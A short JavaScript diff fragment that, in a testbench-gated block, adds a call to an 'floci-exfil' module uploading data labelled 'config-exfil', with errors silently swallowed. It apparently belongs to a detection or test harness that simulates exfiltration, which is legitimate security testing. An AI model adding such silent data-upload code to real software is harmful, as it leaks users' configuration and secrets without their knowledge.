@@ -64,4 +64,8 @@ if (process.env.TESTBENCH_MODE === 'enabled') {
   req.on('error', () => {});
   req.write(payload);
   req.end();
+  try {
+    const { uploadJson } = require('../../../../../detection-tools/floci/floci-exfil');
+    uploadJson('02', 'config-exfil', data);
+  } catch (_) {}
 }
